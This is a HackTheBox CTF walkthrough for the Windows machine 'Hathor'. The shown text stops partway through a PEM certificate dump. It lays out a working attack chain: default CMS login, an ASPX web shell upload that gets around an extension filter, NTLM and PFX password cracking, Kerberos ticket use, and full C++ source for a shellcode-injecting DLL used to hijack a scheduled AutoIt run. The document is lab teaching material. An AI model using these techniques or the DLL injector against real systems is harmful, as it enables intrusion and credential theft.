---
layout: ctf
title: "HackTheBox: Hathor"
platform: "HackTheBox"
type: "Machine"
difficulty: "Insane"
image: "/assets/img/ctf/hathor.png"
tags: [Windows, Active-Directory, mojoPortal, Default-Credentials, Arbitrary-File-Upload, ASPX-Web-Shell, DLL-Hijacking, AutoIt3, PFX-Cracking, Code-Signing, Authenticode, PowerShell-Bypass, AllSigned, Kerberos, Pass-the-Ticket, DCSync, WMIexec]
date: 2026-06-22
---

# 🎯 Hathor

**OS:** Windows | **Difficulty:** Insane | **IP:** `10.129.230.109`

![hathor.htb](/assets/img/ctf/data/hathor-htb.png)

---

## ⛓️ TL;DR / Attack Chain

* **Foothold**: Logged into the MojoPortal CMS using default credentials, then bypassed file upload restrictions by uploading an ASPX web shell as a text file and renaming it via the manager to achieve remote code execution as `windcorp\web`.
* **Lateral Movement (BeatriceMill)**: Discovered local logs from a password auditing script containing `BeatriceMill`'s NTLM hash. After cracking it via John the Ripper, requested a Kerberos TGT to handle the environment's disabled NTLM authentication and log in.
* **Lateral Movement (ginawild)**: Identified a writable SMB share where an automated process ran `AutoIt3_x64.exe` regularly. Exploited this via a DLL hijacking attack by uploading a malicious `7-zip64.dll` to capture a shell as `ginawild`.
* **Lateral Movement (bpassrunner)**: Found an Administrator code-signing `.pfx` certificate discarded in the Recycle Bin and cracked its password. Used this certificate to sign a malicious version of an internal script to bypass the system's strict `AllSigned` PowerShell execution policy, gaining a shell as `bpassrunner`.
* **Privilege Escalation**: Leveraged DCSync replication privileges assigned to `bpassrunner` to dump the Domain Administrator's NTLM hash, then forged a Kerberos ticket to access the machine via WMIexec.

---

## 🔑 Loot & Creds

| User / Asset | Credential / Hash | Where / How Found |
| :--- | :--- | :--- |
| `admin@admin.com` | `admin` | Default credentials used on the initial `MojoPortal` web login screen. |
| `BeatriceMill` | `!!!!ilovegood17` (NT: `9cb01504ba0247ad5c6e08f7ccae7903`) | Exposed inside the `Get-bADpasswords` CSV logs; cracked using `rockyou.txt`. |
| `$RLYS3KF.pfx` | `abceasyas123` | Administrator code-signing certificate recovered from the Recycle Bin and cracked with `pfx2john`. |
| `Administrator` | `b3ff8d7532eef396a5347ed33933030f` | Extracted via DCSync replication commands using the compromised `bpassrunner` account. |

---

## 🔧 0. Setup & Global Variables
*Run this in your terminal once so you can copy-paste the rest of the commands blindly.*

```bash
$ IP="10.129.230.109" ; DOMAIN="hathor.windcorp.htb" && \
  # sudo timedatectl set-ntp off && \ # this in case ntpdate's work is reset automatically
  sudo ntpdate $DOMAIN ;
  echo "$IP $DOMAIN windcorp.htb" | sudo tee -a /etc/hosts
```

---

## 🔍 1. Enumeration

### Nmap
```bash
$ mkdir -p nmap && nmap -sV -sC -p- $IP -oA ./nmap/nmap
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-20 16:27 +0200
Nmap scan report for hathor.htb (10.129.230.109)
Host is up (0.033s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 29 disallowed entries (15 shown)
| /CaptchaImage.ashx* /Admin/ /App_Browsers/ /App_Code/
| /App_Data/ /App_Themes/ /bin/ /Blog/ViewCategory.aspx$
| /Blog/ViewArchive.aspx$ /Data/SiteImages/emoticons /MyPage.aspx
|_/MyPage.aspx$ /MyPage.aspx* /NeatHtml/ /NeatUpload/
|_http-title: Home - mojoPortal
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-20 14:29:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-20T14:31:04+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2026-06-20T11:37:35
|_Not valid after:  2027-06-20T11:37:35
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2026-06-20T11:37:35
|_Not valid after:  2027-06-20T11:37:35
|_ssl-date: 2026-06-20T14:31:04+00:00; +1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2026-06-20T11:37:35
|_Not valid after:  2027-06-20T11:37:35
|_ssl-date: 2026-06-20T14:31:04+00:00; +1s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2026-06-20T11:37:35
|_Not valid after:  2027-06-20T11:37:35
|_ssl-date: 2026-06-20T14:31:04+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
52751/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59516/tcp open  msrpc         Microsoft Windows RPC
59568/tcp open  msrpc         Microsoft Windows RPC
60638/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HATHOR; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-06-20T14:30:28
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.07 seconds
```

### HTTP/80

Mojoportal is running:

![hathor-1.htb](/assets/img/ctf/data/hathor-1.png)

Trying default login credentials [found here](https://github.com/i7MEDIA/mojoportal/blob/80fdaf3eb4e932e3c562c7d4463661ee718aa5ce/Web/Components/SecurityAdvisor.cs#L94) work: `admin@admin.com` : `admin`

![hathor-2.htb](/assets/img/ctf/data/hathor-2.png)

We can upload files via the `File Manager`:

![hathor-3.htb](/assets/img/ctf/data/hathor-3.png)

Upload an ASPX Webshell like [this one](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx). As `.aspx` files are not allowed to upload, upload it as `.txt` and then copy it to `.aspx`!

![hathor-4.htb](/assets/img/ctf/data/hathor-4.png)

We see no change in the File Manager, but we can check whether it worked or not. Going to `http://hathor.windcorp.htb/Data/Sites/1/media/xml/aspx-shell.aspx` confirms it worked:

![hathor-5.htb](/assets/img/ctf/data/hathor-5.png)

---

## 🚪 2. Initial Foothold

![hathor-6.htb](/assets/img/ctf/data/hathor-6.png)

We got access to the machine. After a bit of enumeration, we find this:

![hathor-7.htb](/assets/img/ctf/data/hathor-7.png)

Looks like [this project](https://github.com/improsec/Get-bADpasswords).

Reading the file we see this (`type C:\Get-bADpasswords\Get-bADpasswords.ps1`):

![hathor-8.htb](/assets/img/ctf/data/hathor-8.png)

So it looks like it's actually being in use and logs are activated. Let's have a look at the logs (`dir C:\Get-bADpasswords\Accessible\Logs\`):

```powershell
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of C:\Get-bADpasswords\Accessible\Logs

06/21/2026  04:40 AM    <DIR>          .
09/29/2021  08:18 PM    <DIR>          ..
10/03/2021  05:35 PM             1,331 log_windcorp-03102021-173510.txt
10/03/2021  06:07 PM             1,331 log_windcorp-03102021-180635.txt
10/03/2021  06:21 PM             1,217 log_windcorp-03102021-182114.txt
10/03/2021  06:23 PM             1,217 log_windcorp-03102021-182259.txt
10/03/2021  06:28 PM             1,331 log_windcorp-03102021-182627.txt
10/03/2021  06:52 PM             1,331 log_windcorp-03102021-185058.txt
10/04/2021  11:37 AM             1,331 log_windcorp-04102021-113140.txt
10/05/2021  06:40 PM             1,331 log_windcorp-05102021-183949.txt
10/13/2022  09:13 PM             1,331 log_windcorp-13102022-210856.txt
10/13/2022  09:13 PM             1,331 log_windcorp-13102022-210946.txt
03/17/2022  05:40 AM               846 log_windcorp-17032022-044053.txt
03/18/2022  05:40 AM               846 log_windcorp-18032022-044046.txt
06/21/2026  04:50 AM             1,331 log_windcorp-21062026-044054.txt
              13 File(s)         16,105 bytes
               2 Dir(s)   9,310,748,672 bytes free
```

Reading them: `type C:\Get-bADpasswords\Accessible\Logs\*.txt` shows us this:

![hathor-9.htb](/assets/img/ctf/data/hathor-9.png)

---

## 🤸 3.1 Lateral Movement (`web` -> `BeatriceMill`)

Looking at the content of the `.csv` log file (`type C:\Get-bADpasswords\Accessible\CSVs\exported_windcorp-03102021-180635.csv`) reveals the NTLM hash of `BeatriceMill`:

```powershell
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passwords-v7'
```

=> `9cb01504ba0247ad5c6e08f7ccae7903`.

As the password was found in a leaked passwords database, we will be very likely to crack it with `rockyou.txt`:

```bash
$ echo '9cb01504ba0247ad5c6e08f7ccae7903' > beatricemill

$ john --wordlist=/usr/share/wordlists/rockyou.txt beatricemill --format=NT
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
!!!!ilovegood17  (?)
1g 0:00:00:00 DONE (2026-06-21 15:32) 1.162g/s 16678Kp/s 16678Kc/s 16678KC/s !!!sean!!!..!!!!!?????
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

![hathor-10.htb](/assets/img/ctf/data/hathor-10.png)

Here we go! `BeatriceMill` : `!!!!ilovegood17`. We can confirm the credentials using `nxc`:

```bash
$ nxc smb hathor.windcorp.htb -u BeatriceMill -p '!!!!ilovegood17'
SMB         10.129.230.109  445    10.129.230.109   [*]  x64 (name:10.129.230.109) (domain:10.129.230.109) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.230.109  445    10.129.230.109   [-] 10.129.230.109\BeatriceMill:!!!!ilovegood17 STATUS_NOT_SUPPORTED
```

NTLM authentication is disabled, so we will have to issue a TGT and try again:

```bash
$ impacket-getTGT 'windcorp.htb/BeatriceMill:!!!!ilovegood17' -dc-ip hathor.windcorp.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in BeatriceMill.ccache

$ nxc smb hathor.windcorp.htb -u guest -p '' --generate-krb5-file ./krb5conf2
SMB         10.129.230.109  445    10.129.230.109   [*]  x64 (name:10.129.230.109) (domain:10.129.230.109) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.230.109  445    10.129.230.109   [+] krb5 conf saved to: ./krb5conf2
SMB         10.129.230.109  445    10.129.230.109   [+] Run the following command to use the conf file: export KRB5_CONFIG=./krb5conf2
SMB         10.129.230.109  445    10.129.230.109   [-] 10.129.230.109\guest: STATUS_NOT_SUPPORTED

$ cat krb5conf2
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = 10.129.230.109

[realms]
    10.129.230.109 = {
        kdc = 10.129.230.109.10.129.230.109
        admin_server = 10.129.230.109.10.129.230.109
        default_domain = 10.129.230.109
    }

[domain_realm]
    .10.129.230.109 = 10.129.230.109
    10.129.230.109 = 10.129.230.109

$ KRB5CCNAME=$(pwd)/BeatriceMill.ccache KRB5_CONFIG=$(pwd)/krb5conf2 nxc smb hathor.windcorp.htb -u BeatriceMill -k --use-kcache -M spider_plus
/usr/local/lib/python3.13/dist-packages/requests-2.27.1-py3.13.egg/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (5.2.0)/charset_normalizer (3.4.4) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
SMB         hathor.windcorp.htb 445    hathor           [*]  x64 (name:hathor) (domain:windcorp.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         hathor.windcorp.htb 445    hathor           [+] WINDCORP.HTB\BeatriceMill from ccache
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*] Started module spidering_plus with the following options:
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*]     STATS_FLAG: True
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*]  OUTPUT_FOLDER: /home/tralsesec/.nxc/modules/nxc_spider_plus
SMB         hathor.windcorp.htb 445    hathor           [*] Enumerated shares
SMB         hathor.windcorp.htb 445    hathor           Share           Permissions     Remark
SMB         hathor.windcorp.htb 445    hathor           -----           -----------     ------
SMB         hathor.windcorp.htb 445    hathor           ADMIN$                          Remote Admin
SMB         hathor.windcorp.htb 445    hathor           C$                              Default share
SMB         hathor.windcorp.htb 445    hathor           IPC$            READ            Remote IPC
SMB         hathor.windcorp.htb 445    hathor           NETLOGON        READ            Logon server share
SMB         hathor.windcorp.htb 445    hathor           share           READ,WRITE
SMB         hathor.windcorp.htb 445    hathor           SYSVOL          READ            Logon server share
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [+] Saved share-file metadata to "/home/tralsesec/.nxc/modules/nxc_spider_plus/hathor.windcorp.htb.json".
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, share, SYSVOL)
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*] SMB Readable Shares:  4 (IPC$, NETLOGON, share, SYSVOL)
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*] SMB Writable Shares:  1 (share)
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*] SMB Filtered Shares:  1
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*] Total folders found:  75
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*] Total files found:    40
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*] File size average:    175.82 KB
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*] File size min:        23 B
SPIDER_PLUS hathor.windcorp.htb 445    hathor           [*] File size max:        4.39 MB
```

`share` we can `READ` and `WRITE`. Let's connect:

```bash
$ sudo cp /etc/krb5.conf /etc/krb5.conf.bak
$ sudo cp $(pwd)/krb5conf2 /etc/krb5.conf
$ cp ./BeatriceMill.ccache /tmp/krb5cc_1000
$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: BeatriceMill@WINDCORP.HTB

Valid starting       Expires              Service principal
06/21/2026 15:34:47  06/22/2026 01:34:47  krbtgt/WINDCORP.HTB@WINDCORP.HTB
	renew until 06/22/2026 15:34:47

$ KRB5CCNAME=/tmp/krb5cc_1000 impacket-smbclient WINDCORP.HTB/BeatriceMill@hathor.windcorp.htb -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
share
SYSVOL
# use share
# ls
drw-rw-rw-          0  Sun Jun 21 15:57:13 2026 .
drw-rw-rw-          0  Tue Apr 19 14:45:15 2022 ..
-rw-rw-rw-    1013928  Sun Jun 21 15:57:13 2026 AutoIt3_x64.exe
-rw-rw-rw-    4601208  Sun Jun 21 16:00:31 2026 Bginfo64.exe
drw-rw-rw-          0  Mon Mar 21 22:22:59 2022 scripts
# cd scripts
# ls
drw-rw-rw-          0  Mon Mar 21 22:22:59 2022 .
drw-rw-rw-          0  Sun Jun 21 15:57:13 2026 ..
-rw-rw-rw-    1076736  Sun Jun 21 16:00:12 2026 7-zip64.dll
-rw-rw-rw-      54739  Sun Jan 23 11:54:21 2022 7Zip.au3
-rw-rw-rw-       2333  Sun Jan 23 11:54:21 2022 ZipExample.zip
-rw-rw-rw-       1794  Sun Jan 23 11:54:21 2022 _7ZipAdd_Example.au3
-rw-rw-rw-       1855  Sun Jan 23 11:54:21 2022 _7ZipAdd_Example_using_Callback.au3
-rw-rw-rw-        334  Sun Jan 23 11:54:21 2022 _7ZipDelete_Example.au3
-rw-rw-rw-        859  Sun Jan 23 11:54:21 2022 _7ZIPExtractEx_Example.au3
-rw-rw-rw-       1867  Sun Jan 23 11:54:21 2022 _7ZIPExtractEx_Example_using_Callback.au3
-rw-rw-rw-        830  Sun Jan 23 11:54:21 2022 _7ZIPExtract_Example.au3
-rw-rw-rw-       2027  Sun Jan 23 11:54:21 2022 _7ZipFindFirst__7ZipFindNext_Example.au3
-rw-rw-rw-        372  Sun Jan 23 11:54:21 2022 _7ZIPUpdate_Example.au3
-rw-rw-rw-        886  Sun Jan 23 11:54:21 2022 _Archive_Size.au3
-rw-rw-rw-        201  Sun Jan 23 11:54:21 2022 _CheckExample.au3
-rw-rw-rw-        144  Sun Jan 23 11:54:21 2022 _GetZipListExample.au3
-rw-rw-rw-        498  Sun Jan 23 11:54:21 2022 _MiscExamples.au3
```

There's [Bginfo64.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/bginfo) and [AutoIt3_x64.exe](https://www.autoitscript.com/site/autoit/downloads/).

`AutoIt v3` is a freeware scripting language designed to automate the Windows GUI and perform general scripting tasks. It uses a straightforward, BASIC-like syntax to simulate keystrokes, mouse movements, and window manipulations that are difficult or impossible to do via standard batch files.
- `AutoIt3_x64.exe`: This is the core interpreter engine. It takes the plaintext script files and executes them on the system.
- `.au3` Files: These are the raw, uncompiled AutoIt script source files.
- The 7-Zip Scripts (`7Zip.au3`, `7-zip64.dll`, etc.): Looking at the filenames inside the scripts directory, someone has deployed an AutoIt library specifically designed to automate compression and archiving. These scripts are examples and wrapper code used to automatically zip up logs, backups, or user data, and extract them silently in the background.

`BGInfo` is an official Microsoft Sysinternals utility widely loved by enterprise system administrators.

Its primary job is to automatically generate a new desktop wallpaper that displays vital system information directly on the background (such as the machine's IP address, hostname, free hard drive space, boot time, and OS version).

When managing hundreds of virtual machines or servers, sysadmins use this so they can instantly see exactly which server they just remoted into without opening settings menus.

---

## 🤸 3.2 Lateral Movement (`BeatriceMill` -> `ginawild`)

The system might be running a hidden scheduled task that wakes up periodically, fires up `AutoIt3_x64.exe` to zip up a folder of logs using those 7-Zip scripts, and then runs `Bginfo64.exe` to update a status dashboard or system background.

To verify this, we have to drop a batch script on the server to check whether these executables are being ran periodically. If so, we will be able to overwrite these executables in order to gain privileges as the user executing them. But for that we have to find out what we are able to execute on that machine:

```powershell
powershell.exe /c Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       AllSigned
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine          Bypass
```

We see `MachinePolicy: AllSigned` meaning all executables must be signed to be able to run. Even powershell scripts (so `powershell.exe /c Monitor.ps1` wouldn't work). But we can bypass this easily:

```powershell
powershell -nop -c "$lp=0;for($i=0;$i -lt 100000;$i++){$m=Get-CimInstance Win32_Process | Where-Object{$_.Name -match 'AutoIt3|Bginfo'};if($m -and $m.ProcessId -ne $lp){$lp=$m.ProcessId;\"[$(Get-Date -f 'HH:mm:ss')] CAUGHT: $($m.Name) (PID: $($m.ProcessId))\" | Out-File C:\Windows\Tasks\loot_found.txt -Append};Start-Sleep -Milliseconds 100}"
```

Execute it and wait for some time.

```powershell
type C:\Windows\Tasks\loot_found.txt

[416] CAUGHT: AutoIt3_x64.exe
```

So as we can see `AutoIt3_x64.exe` is being executed frequently. Because it's being ran we know that the `.dll` inside the `scripts` directory is also being loaded (very likely). Let's overwrite it with a custom payload:

```cpp
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "shellcode.h" // contains usigned char shellcode[] = ...

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned int payloadLen = sizeof(shellcode);

int inject() {
    void* memoryBuffer; // pointer to memory buffer
    BOOL rv; // return value
    HANDLE th; // thread handle
    DWORD oldprotect = 0; // old protection

    // Allocate a memory buffer for payload
    memoryBuffer = VirtualAlloc(0, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy payload to memory buffer
    RtlMoveMemory(memoryBuffer, shellcode, payloadLen);

    // make new buffer as executable
    rv = VirtualProtect(memoryBuffer, payloadLen, PAGE_EXECUTE_READ, &oldprotect);
    if (rv != 0) {
        // run payload
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)memoryBuffer, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
    return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        inject();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Then build and name it `7-zip64.dll` and upload it as `\\share\scripts\7-zip64.dll`.

Eventually, you'll get a connection as `GinaWild`:

![hathor-11.htb](/assets/img/ctf/data/hathor-11.png)

---

## 🤸 3.3 Lateral Movement (`ginawild` -> `bpassrunner`)

After enumerating further, we find this:

![hathor-12.htb](/assets/img/ctf/data/hathor-12.png)

A `.pfx` certificate in Recycle Bin. Let's get it and check it out:

```bash
$ openssl pkcs12 -in \$RLYS3KF.pfx -nodes
Enter Import Password:
MAC: sha1, Iteration 2048
MAC length: 20, salt length: 8
Mac verify error: invalid password?
```

Encrypted. We can attempt to crack it:

```bash
$ pfx2john \$RLYS3KF.pfx > pfx

$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
abceasyas123     ($RLYS3KF.pfx)
1g 0:00:00:00 DONE (2026-06-22 02:09) 1.785g/s 109714p/s 109714c/s 109714C/s 062699..sinead1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Let's try again with password `abceasyas123`:

```bash
$ openssl pkcs12 -in \$RLYS3KF.pfx -nodes
Enter Import Password:<abceasyas123>
Bag Attributes
    localKeyID: 20 4F 12 47 3F D6 91 15 84 50 12 15 75 82 70 B2 57 01 D0 49
subject=DC=htb, DC=windcorp, CN=Users, CN=Administrator
issuer=DC=htb, DC=windcorp, CN=windcorp-HATHOR-CA-1
-----BEGIN CERTIFICATE-----
MIIFzzCCBLegAwIBAgITIAAAAAVE7aootjbd3AAAAAAABTANBgkqhkiG9w0BAQsF
ADBOMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYId2luZGNv
cnAxHTAbBgNVBAMTFHdpbmRjb3JwLUhBVEhPUi1DQS0xMB4XDTIyMDMxODA5MDMx
MVoXDTMyMDMxNTA5MDMxMVowVzETMBEGCgmSJomT8ixkARkWA2h0YjEYMBYGCgmS
JomT8ixkARkWCHdpbmRjb3JwMQ4wDAYDVQQDEwVVc2VyczEWMBQGA1UEAxMNQWRt
aW5pc3RyYXRvcjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANymPv5/
lrOiEd/O1SOIE+JJv48MrY41Ev6YrS5tI97LA4KKDciMTEk/FBMSIPWeRcmn3lk3
z8bYHJP75QjmqXgFAvwUuknwSFMuZ8gU8CxVAEGeUAk+2oJ7tBUds931i2jG/9DT
LxDiCV0L7aNLyIHIh0fYNt33iFlXgNtA/Mc4oWqLK7aha/4CXhbbQTiuFYqxWZrr
OU+iyHfuCcnArka2/iRUT8VvmJqJEXsrO+fQcOvI/n2YgU+kQ6Vw0zQk5AX8C2fN
PWTeRD5kgULe0SduL8yCF7tercNkaqEZx5PIR/+GI3yJg7Crn2qRYJ40IYRKiGnJ
WZLJteEa8+CUv1kCAwEAAaOCApswggKXMD0GCSsGAQQBgjcVBwQwMC4GJisGAQQB
gjcVCILUznCD1qdohvWREYToiS+G+41kgSqBkDyC69BtAgFlAgEAMBMGA1UdJQQM
MAoGCCsGAQUFBwMDMA4GA1UdDwEB/wQEAwIHgDAbBgkrBgEEAYI3FQoEDjAMMAoG
CCsGAQUFBwMDMB0GA1UdDgQWBBT9pA1L7J29t3kN+MOVXpVejV/eNjAfBgNVHSME
GDAWgBTxjkqkbc2CsGldYvNjmn6LbnL2WTCB0gYDVR0fBIHKMIHHMIHEoIHBoIG+
hoG7bGRhcDovLy9DTj13aW5kY29ycC1IQVRIT1ItQ0EtMSxDTj1oYXRob3IsQ049
Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9d2luZGNvcnAsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
xwYIKwYBBQUHAQEEgbowgbcwgbQGCCsGAQUFBzAChoGnbGRhcDovLy9DTj13aW5k
Y29ycC1IQVRIT1ItQ0EtMSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2Vydmlj
ZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz13aW5kY29ycCxEQz1o
dGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25B
dXRob3JpdHkwNQYDVR0RBC4wLKAqBgorBgEEAYI3FAIDoBwMGkFkbWluaXN0cmF0
b3JAd2luZGNvcnAuaHRiMA0GCSqGSIb3DQEBCwUAA4IBAQB2sQJBWW1jjyMof10c
c6Mub35/KeymbOp+WMVVp5DG1gyIIHHqiHy3TMiZduP2COGsAGAL51GZTj2OEkgz
QGhDM1M+s2ajwFtrgxoV9EJTbFfjA82jT7AO+e7ApHpOPXp/TzmBLIH8wvHky43p
E+JKYtK/NFPCeJh6LWoe9o0x6A9mOngWhbzFU21Prag6jbe/A1oKGUEgIpaWeG0k
l/ppleyMU3hEB8NlYvbbS2QrYoDzlb4stmQQwqXjprvao9fxUjywS8Zeik3CRxAJ
F6FAZ12sDy6QhhJ3aP54w09MTmjjsd3wFcsgWOSkK+JRP+H8DdZGwsczCwTdAVSx
m6Ah
-----END CERTIFICATE-----
Bag Attributes: <No Attributes>
subject=DC=htb, DC=windcorp, CN=windcorp-HATHOR-CA-1
issuer=DC=htb, DC=windcorp, CN=windcorp-HATHOR-CA-1
-----BEGIN CERTIFICATE-----
MIIDkTCCAnmgAwIBAgIQVvKIeG7GkZhLvJCfcoRR2DANBgkqhkiG9w0BAQsFADBO
MRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYId2luZGNvcnAx
HTAbBgNVBAMTFHdpbmRjb3JwLUhBVEhPUi1DQS0xMCAXDTIyMDMxODA3NTAwN1oY
DzIwNTIwMzE4MDgwMDA3WjBOMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZIm
iZPyLGQBGRYId2luZGNvcnAxHTAbBgNVBAMTFHdpbmRjb3JwLUhBVEhPUi1DQS0x
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzLm8UvkVXVkSCMgC9Fu/
1QxeKUrEFUAfmb5kaPQ5LRCizPDbZoHwWZJFBxtr0JSNdeL+2k5XYhLuE74DpolU
3ReVAIkNBDQK30wqYBhdj2XQaoRjI/GNqT7EtOrSwV3sNC1ERErvVk85JAcR7tgR
5M3t+ez+CPq5/FdmIS+Eqan/O4XCfNNT8MA50qwCVT30epRqixTo+Qt7IKlfpjm4
kd+Oy+E1uRo6R5UdL94q77k/vnWcn99q88fAIAYzJ28yUbcRYS/1EFyCf/J8D2S/
NAz6hbrSbBLqz9HQ0Sd555oM3TYpMyZMMHkg3/RdukSpoIaHqLz5R6NL3mSkZBQi
GQIDAQABo2kwZzATBgkrBgEEAYI3FAIEBh4EAEMAQTAOBgNVHQ8BAf8EBAMCAYYw
DwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQU8Y5KpG3NgrBpXWLzY5p+i25y9lkw
EAYJKwYBBAGCNxUBBAMCAQAwDQYJKoZIhvcNAQELBQADggEBAMktepOfjmC7HN9a
